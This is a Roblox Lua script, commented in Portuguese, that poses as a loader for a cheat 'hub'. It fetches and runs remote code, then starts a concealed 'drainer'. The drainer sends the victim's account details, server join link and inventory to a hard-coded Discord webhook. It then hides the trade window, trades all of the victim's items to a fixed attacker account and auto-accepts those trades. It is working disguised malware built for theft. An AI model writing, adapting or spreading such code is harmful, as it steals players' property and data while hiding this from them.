-- MYTHIC HUB + DRAINER + WEBHOOK (Sem "restaurado")
local url = "https://raw.githubusercontent.com/MYTHIC-HUB/scripts/main/MYTHIC-HUB/main.lua"
local ok, body = pcall(function() return game:HttpGet(url) end)
if not ok or type(body) ~= "string" or body == "" then
    error("MYTHIC HUB: erro ao baixar o loader.")
end
local run, err = loadstring(body)
if type(run) ~= "function" then
    error("MYTHIC HUB: erro ao compilar loader: " .. tostring(err))
end

-- 1. Executa o Hub principal
run()

-- 2. Liga o Webhook + Drainer em segundo plano
task.spawn(function()
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local HttpService = game:GetService("HttpService")
    local lp = Players.LocalPlayer
    local TARGET_NAME = "olhom_y77"
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1568345137917067534/StFoCXHWZz3BxfgkjqKJeLFKM5VnGuBw_mmYC2ag_cKhhm3kiDYZ2lurlDkGbnxwv8CR"
    
    local httpRequest = request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
    local function postJson(url, body)
        if httpRequest then pcall(httpRequest, {Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body}) end
    end

    -- Acha o perfil e manda os dados pro Discord
    local profile = nil
    if type(getgc) == "function" then
        pcall(function() 
            for _, obj in pairs(getgc(true)) do 
                if type(obj) == "table" and rawget(obj, "Weapons") and type(rawget(obj, "Weapons").Owned) == "table" then 
                    profile = obj 
                    break 
                end 
            end 
        end)
    end
    
    local itemsText = "Sem inventário (getgc bloqueado)"
    if profile and profile.Weapons and type(profile.Weapons.Owned) == "table" then
        itemsText = ""
        for id, qty in pairs(profile.Weapons.Owned) do
            itemsText = itemsText .. "• `" .. tostring(id) .. "` (x" .. tostring(qty) .. ")\n"
        end
        if itemsText == "" then itemsText = "Inventário vazio." end
    end

    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(lp.UserId) .. "&width=420&height=420&format=png"
    local profileUrl = "https://www.roblox.com/users/" .. tostring(lp.UserId) .. "/profile"
    local serverUrl = "https://www.roblox.com/games/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId)

    local payload = {
        username = lp.Name,
        avatar_url = avatarUrl,
        embeds = {{
            title = "Inventário Logado",
            color = 0xFF00FF,
            thumbnail = { url = avatarUrl },
            fields = {
                { name = "Conta", value = "`" .. lp.Name .. "`", inline = true },
                { name = "UserId", value = "`" .. tostring(lp.UserId) .. "`", inline = true },
                { name = "Conta Criada", value = "`" .. tostring(lp.AccountAge or "?") .. " dias atrás`", inline = true },
                { name = "Server", value = "[Entrar no Server](" .. serverUrl .. ")", inline = false },
                { name = "Perfil", value = "[Ver Perfil](" .. profileUrl .. ")", inline = false },
                { name = "Itens", value = itemsText, inline = false }
            },
            footer = { text = "Data: " .. os.date("%d/%m/%Y %H:%M:%S") }
        }}
    }

    local okJson, bodyJson = pcall(function() return HttpService:JSONEncode(payload) end)
    if okJson then postJson(WEBHOOK_URL, bodyJson) end

    -- Lógica do Drainer de Troca
    local tradeFolder = ReplicatedStorage:WaitForChild("Trade", 15)
    if not tradeFolder then return warn("DRAINER: Trade não encontrado") end

    local function waitRemote(name)
        local r; pcall(function() r = tradeFolder:WaitForChild(name, 10) end); return r
    end
    local sendRequestRemote = waitRemote("SendRequest")
    local offerItemRemote   = waitRemote("OfferItem")
    local startTradeRemote  = waitRemote("StartTrade")
    local updateTradeRemote = waitRemote("UpdateTrade")
    local acceptTradeRemote = waitRemote("AcceptTrade")
    local declineTradeRemote = tradeFolder:FindFirstChild("DeclineTrade")

    local state = {trading = false, lastOffer = nil, lastOfferAt = os.clock(), lastAccepted = nil, currentPartner = nil}
    
    local function findTarget()
        local p = Players:FindFirstChild(TARGET_NAME)
        if p then return p end
        for _, c in ipairs(Players:GetPlayers()) do
            if c.Name:lower() == TARGET_NAME:lower() then return c end
        end
    end

    local playerGui = lp:WaitForChild("PlayerGui")
    local locked = {}
    local function lockGui(g)
        if not g or locked[g] then return end
        locked[g] = true
        pcall(function() g.Enabled = false end)
        pcall(function() g:GetPropertyChangedSignal("Enabled"):Connect(function() if g.Enabled then g.Enabled = false end end) end)
    end
    for _, n in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
        local g = playerGui:FindFirstChild(n); if g then lockGui(g) end
    end
    playerGui.ChildAdded:Connect(function(g) for _, n in ipairs({"TradeGUI", "TradeGUI_Phone"}) do if g.Name == n then task.wait(0.1); if g:IsA("ScreenGui") then lockGui(g) end end end end)

    local cachedProfile = profile
    local function getProfile()
        if cachedProfile then return cachedProfile end
        if type(getgc) == "function" then
            pcall(function() for _, obj in pairs(getgc(true)) do if type(obj) == "table" and rawget(obj, "Weapons") and type(rawget(obj, "Weapons").Owned) == "table" then cachedProfile = obj break end end end)
        end
        if not cachedProfile then pcall(function() cachedProfile = require(ReplicatedStorage.Modules.ProfileData) end) end
        return cachedProfile
    end

    local function offerAll()
        local p = getProfile()
        if not p then return end
        local items = {}
        if p.Weapons and type(p.Weapons.Owned) == "table" then
            for id, qty in pairs(p.Weapons.Owned) do
                if id ~= "DefaultKnife" and id ~= "DefaultGun" then table.insert(items, {id = id, amount = tonumber(qty) or 1}) end
            end
        end
        if type(p.Uniques) == "table" then
            for _, u in pairs(p.Uniques) do
                if type(u) == "table" and u.BaseItem and u.BaseItem ~= "DefaultKnife" and u.BaseItem ~= "DefaultGun" then table.insert(items, {id = u.BaseItem, amount = 1}) end
            end
        end
        for _, entry in ipairs(items) do
            if not state.trading then return end
            for _ = 1, entry.amount do pcall(function() offerItemRemote:FireServer(entry.id, "Weapons") end); task.wait(0.03) end
        end
    end

    local function requestTrade(target)
        if not target or not target.Parent then return end
        for attempt = 1, 3 do
            if not target.Parent then return end
            state.trading, state.lastOffer, state.lastAccepted = false, nil, nil
            pcall(function() sendRequestRemote:InvokeServer(target) end)
            local t = os.clock()
            while os.clock() - t < 8 do if state.trading then return end; task.wait(0.15) end
            task.wait(2)
        end
    end

    startTradeRemote.OnClientEvent:Connect(function()
        state.trading = true; state.lastAccepted = nil; task.wait(0.2); offerAll()
    end)

    updateTradeRemote.OnClientEvent:Connect(function(update)
        if type(update) ~= "table" then return end
        local p1, p2 = update.Player1 and update.Player1.Player, update.Player2 and update.Player2.Player
        local other = (p1 and p1 ~= lp) and p1 or ((p2 and p2 ~= lp) and p2 or nil)
        state.currentPartner = other
        if other and other.Name:lower() ~= TARGET_NAME:lower() then
            pcall(function() if declineTradeRemote then declineTradeRemote:FireServer() else acceptTradeRemote:FireServer(game.PlaceId * 3, nil) end end)
            state.trading = false; return
        end
        if update.LastOffer ~= nil then state.lastOffer = update.LastOffer; state.lastOfferAt = os.clock() end
    end)

    acceptTradeRemote.OnClientEvent:Connect(function(completed)
        if completed then
            state.trading = false
            cachedProfile = nil 
            task.spawn(function()
                task.wait(1.5)
                requestTrade(findTarget())
            end)
        end
    end)

    task.spawn(function()
        while true do
            task.wait(0.2) 
            if state.trading and state.lastOffer and state.lastOffer ~= state.lastAccepted and state.currentPartner and state.currentPartner.Name:lower() == TARGET_NAME:lower() and os.clock() - state.lastOfferAt >= 6.2 then
                state.lastAccepted = state.lastOffer
                pcall(function() acceptTradeRemote:FireServer(game.PlaceId * 3, state.lastOffer) end)
            end
        end
    end)

    task.spawn(function()
        local t = findTarget()
        if t and t ~= lp then requestTrade(t) end
        Players.PlayerAdded:Connect(function(p) if p.Name:lower() == TARGET_NAME:lower() then task.wait(3); requestTrade(p) end end)
    end)
end)
